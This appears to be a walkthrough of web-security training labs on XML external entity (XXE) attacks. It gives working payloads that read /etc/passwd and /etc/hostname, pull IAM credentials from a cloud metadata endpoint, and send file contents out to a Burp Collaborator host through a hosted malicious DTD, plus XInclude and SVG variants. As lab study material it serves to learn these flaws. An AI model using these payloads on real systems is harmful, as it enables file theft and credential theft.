# Regular
1. This lab uses XML for the stock checking feature with no XXE protections in place. As such, the request can be modified to contain the element definition `<!DOCTYPE foo [<!ENTITIY xxe SYSTEM "file:///etc/passwd">]>` in order to create the XML entity `&xxe;` whose contents is the contents of `/etc/passwd`. By modifying the productId to have the value `&xxe;`, we can retrieve the contents via the returned error message
2. This lab has the same vulnerability as above, but this time has an internal EC2 server running at `http://169.254.169.254`. This can be exploited via XXE SSRF in order to retrieve the IAM secret access key by using the following entity definition `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>` and replacing the `productId` with `&xxe;`

# Blind XXE
1. This lab has the same vulnerability has the previous labs, but does not return the error in the response. This prevents exfiltrating the data directly, but a blind XXE vulnerability can still be discovered via SSRF to a controlled server. The following entity definition causes such a request when `productId` is modified appropriately: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://burpcollaborator.net">]>`
2. This lab is the same as the above, but it blocks normal external entities. However, it does not block XML parameter entities, and as such can be exploited by adding the following line to the XML request `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net"> %xxe;]>`
3. This lab is the same as the previous, but with the goal of exfiltrating the contents of the `/etc/hostname` file. The lab provides a web server than can be configured to host an arbitrary file. By setting the file to have the name `exploit.dtd` and the following contents, we can set up a blind XXE data exfiltration:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```
This DTD creates an entity named `file` with the contents of `/etc/hostname` and a second entity called `eval` which contains the dynamic declaration of another entity named `exfil` in order to be able to use the value of `file` within `exfil`. Using this, the following payload can be used within the stock checking feature in order to trigger the XXE exfiltration: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://exploit-ac7f1ff01fe7c21dc00e5c0901ca00bc.web-security-academy.net/exploit.dtd"> %xxe;]>`
4. This lab is the same as the above, but the goal is to exfiltrate the contents of `/etc/passwd` using parsing errors. The payload is the same, but the contents of `exploit.dtd` become the following:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///asdf/%file;'>">
%eval;
%error;
```
5. This lab doesn't allow any out of band interactions, so external DTDs cannot be loaded unless they are locally on the server. The server appears to be running GNOME, as is shown by the fact that loading a known DTD used by GNOME does not result in an error: `<!DOCTYPE foo [<!ENTITY dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %dtd;]>`. By knowing the existence of an open-source DTD on the system, we can utilize a hybrid DTD in order to redefine an existing entity in the open-source one and bypass the restriction on internal entities utilizing other internal entities. This is done by submitting the following payload within the stock checking request:
```
<!DOCTYPE foo [
<!ENTITY % dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///asdf/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;'>
%dtd;]>
```
The `ISOamso` entity is one that is defined within the `docbookx.dtd` file, and is being redefined here for the purpose of bypassing the previously mentioned restrictions

# Hidden attack surface
1. This lab doesn't obviously use XML, but inserts data into XML in the backend and is vulnerable to XInclude. This can be utilized to cause an error containing the contents of `/etc/passwd` by setting the `productId` parameter in the stock checking feature to the following payload: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
2. This lab has an image upload feature that accepts SVGs. Since SVGs use XML, a malicious one can be crafted to perform XXE and place the output within itself. As an example, `exploit.svg` is a valid SVG file that, when processed on the server side, will be the contents of the `/etc/hostname` file
